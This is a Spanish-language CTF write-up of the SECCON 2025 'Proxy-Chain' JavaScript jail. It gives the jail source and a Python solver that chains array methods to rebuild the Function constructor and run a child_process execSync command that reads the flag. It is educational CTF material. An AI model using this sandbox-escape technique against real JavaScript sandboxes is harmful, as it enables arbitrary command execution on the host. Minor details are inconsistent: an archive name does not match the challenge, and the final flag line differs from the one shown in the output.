---
title: Proxy-Chain - SecconCTF2025
author: Kesero
description: Reto basado en escapar de una jail en JavaScript mediante el uso de programación funcional obteniendo acceso a Function sin nombrarlo
date: 2025-12-14 18:57:00 +0100
categories: [Writeups Competiciones Internacionales, Miscelánea]
tags: [Misc, Misc - JSjail, Otros - Writeups, Dificultad - Difícil, SecconCTF]
pin: false
math: true
mermaid: true
image:
  path: https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/SecconCTF2025/Jail/proxy-chain/prompt.png
  lqip: 
  alt: 
comments: true
---

Autor del reto: `Ark`

Veces resuelto: 3

Dificultad: <font color=red>Difícil</font>

## Enunciado

```
Functional programming in JavaScript
```

## Archivos

- `proxy-chain.tar.gz` : Contiene el Docker de la infraestructura del reto.
- `nc proxy-chain.seccon.games 5000`: Conexión por netcat al servidor.

```
broken-json.tar.gz
|
├── compose.yaml
├── Dockerfile
├── flag.txt
├── jail.js
├── index.js
```

Archivos utilizados en mi [repositorio de GitHub](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/SecconCTF2025/Jail/proxy-chain).


## Analizando el reto

En el archivo `index.js` se encuentra lo siguiente:

```js
#!/usr/local/bin/node

const readline = require("node:readline/promises");
const { promisify } = require("node:util");
const { execFile } = require("node:child_process");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

(async () => {
  const code = (await rl.question("Your code: ")).trim();

  const proc = await promisify(execFile)(
    "/usr/local/bin/node",
    ["jail.js", code],
    {
      timeout: 2000,
    }
  ).catch((e) => e);

  console.log(proc.killed ? "timeout" : proc.stdout);
})().finally(() => rl.close());

```

En el archivo `jail.js` se encuentra la funcionalidad principal de la jail:
```js
const validate = (code) => {
  /*
    E.g.
      root()
      root.foo()
      root.foo.bar(root.baz())
      root.foo.bar(root.baz(root))
  */
  const pattern = /^root(\.\w+)*(\((?<recursive>.*)\))?$/;

  const found = code.match(pattern);
  if (!found) return false;

  const { recursive = "" } = found.groups;
  if (recursive.length === 0) return true;

  return validate(recursive);
};

const saved = new WeakMap();
const unwrap = (proxy) => (saved.has(proxy) ? unwrap(saved.get(proxy)) : proxy);

const wrap = (raw) => {
  if (raw === Function) process.exit(1); // banned!!!
  if (raw == null) return raw;

  const proxy = new Proxy(Object(raw), {
    get() {
      return wrap(Reflect.get(...arguments));
    },
    apply(target, thisArg, argArray) {
      return wrap(Reflect.apply(target, unwrap(thisArg), argArray.map(unwrap)));
    },
  });

  saved.set(proxy, raw);
  return proxy;
};

const code = process.argv[2].trim();
if (!validate(code)) {
  console.log("Invalid code");
  process.exit(1);
}

try {
  Function("root", code)(wrap([]));
} catch {}
```

El código anterior pertenece a una jail en JavaScript la cual solo permite llamar propiedades y métodos encadenados desde `root` (que es un array []). Además prohíbe acceder directamente a `Function` y solo se pueden hacer llamadas como `root.propiedad.método(root.otroMétodo())`.


## Solver

Para resolver esta jail, se tendrá que realizar una cadena masiva de llamadas anidadas que construya la palabra `constructor` letra por letra utilizando métodos de array para obtener el constructor `Function` sin nombrarlo directamente para en última instancia, ejecutar el código arbitrario construido dinámicamente.

En este contexto, se pueden explotar los métodos que tienen nombres (strings) junto con el acceso permitido a `String.prototype.constructor` desde esos nombres. Con el constructor de `String` se puede llegar a `Function` y una vez tenemos acceso a `Function`, se puede ejecutar código arbitrario usando `bind`, `apply`, etc.

El código final es el siguiente:

```py
def char(c):
    if c == "":
        return [
            "root.flat",
            "root.at",
            "root.at",
            "root.at.name.slice",
            "root.push",
        ]

    METHOD_MAP = {
        'a': ('at', 0),
        'b': ('map.bind', 0),
        'c': ('concat', 0),
        'd': ('reduce', 2),
        'e': ('every', 0),
        'f': ('fill', 0),
        'g': ('at.name.constructor', 5),
        'h': ('hasOwnProperty', 0),
        'i': ('includes', 0),
        'j': ('join', 0),
        'k': ('keys', 0),
        'l': ('lastIndexOf', 0),
        'm': ('map', 0),
        'n': ('concat', 2),
        'o': ('concat', 1),
        'p': ('push', 0),
        # 'q'
        'r': ('reduce', 0),
        's': ('shift', 0),
        't': ('toSorted', 0),
        'u': ('unshift', 0),
        'v': ('every', 1),
        'w': ('with', 0),
        'x': ('lastIndexOf', 8),
        'y': ('every', 4),
        # 'z'
        'S': ('at.name.constructor', 0),
        'M': ('flatMap', 4),
        '_': ('__defineGetter__', 0),
    }

    if c in METHOD_MAP:
        method_name, index = METHOD_MAP[c]
        
        result = ["root.flat"]
        result.extend(["root.at"] * index)
        result.append(f"root.{method_name}.name.at")
        result.append("root.push")    
    else:
        result = ["root.flat"]
        result.extend(["root.at"] * ord(c))
        result.append("root.at.name.constructor.fromCharCode")
        result.append("root.push")
    return result


funcs = []
funcs += [
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.shift",
]

funcs += char("c") + char("o") + char("n") + char("s") + char("t") + char("r") + char("u") + char("c") + char("t") + char("o") + char("r") + char("")


funcs += [
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.pop",
    "root.join",
    "root.push",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
]

funcs += [
    "root.map.bind",
    "root.__proto__.__proto__.constructor.getPrototypeOf",
    "root.unshift",
]

funcs += [
    "root.__proto__.__proto__.constructor.getOwnPropertyDescriptor.bind",
    "root.reduce",
    "root.push",
    "root.shift",
    "root.shift",
]

funcs += [
    "root.at",
    "root.push",
    "root.unshift",
    "root.pop",
    "root.flat",
    "root.push",
    "root.shift",
    "root.shift",
    "root.flat",
    "root.__proto__.__proto__.constructor.fromEntries",
    "root.push",
    "root.shift",
]

funcs += [
    "root.valueOf",
    "root.push",
]

funcs += [
    "root.__proto__.__proto__.constructor.defineProperties.bind",
    "root.sort",
    "root.shift",
    "root.shift",
]

funcs += [
    "root.unshift",
    "root.push",
    "root.shift",
    "root.pop",
    "root.slice",                         # copy [Function] to use as argsArray
    "root.push",                          # root -> [Function, [Function]]
    "root.map.__proto__.bind.valueOf",    # get Function.prototype.bind.bind
    "root.map.__proto__.bind.apply.bind", # apply.bind(bind)
    "root.reduce",                        # reduce with cb -> Function.bind(Function)
]

funcs += [
    "root.unshift",
    "root.indexOf",
    "root.splice",
    "root.indexOf",
    "root.splice",
]

funcs += [
    "root.pop",
] + ["root.push"] * 120 + [
    "root.shift",
    "root.push",
]

funcs += char("")
payload_1 = "console.log(process.mainModule.require('child_process').execSync('nl /f*')+"
for ch in payload_1:
    funcs += char(ch)

payload_2 = "'')//"
funcs += char("'")
funcs += [
    "root.flat",
    "root.indexOf",
    "root.at",
    "root.push"
]
funcs += char(")")
funcs += char("/")
funcs += [
    "root.flat",
    "root.indexOf",
    "root.at",
    "root.push"
]

funcs += ["root.shift"] * 120 + [
    "root.push",
    "root.shift",
    "root.join",
    "root.push",
]
funcs += ["root.shift"] * len(payload_1 + payload_2)

funcs += [
    "root.flat",
    "root.indexOf",
    "root.slice",
    "root.unshift",
    "root.pop",
    "root.shift",
    "root.push",
]

funcs += [
    "root.flat",
    "root.at",
    "root.map.__proto__.bind.apply.bind",
    "root.reduce",
    "root.sort",
]

result = ""
for func in funcs:
    result = func + "(" + result + ")"

print(result)
```

```
┌──(kesero㉿kali)-[~]
└─$ python solver_proxy.py | nc proxy-chain.seccon.games 5000

    Your code:      1	
    SECCON{inspir3d_by_pyj4il_at_https://github.com/jailctf/challenges-2024/tree/master/functional-programming#29934258042408635}
```


## Flag

`SECCON{inspir3d_by_pyj4il_at_https://github.com/jailctf/challenges-2024/tree/masterfunctional-programming#29934258042408635}`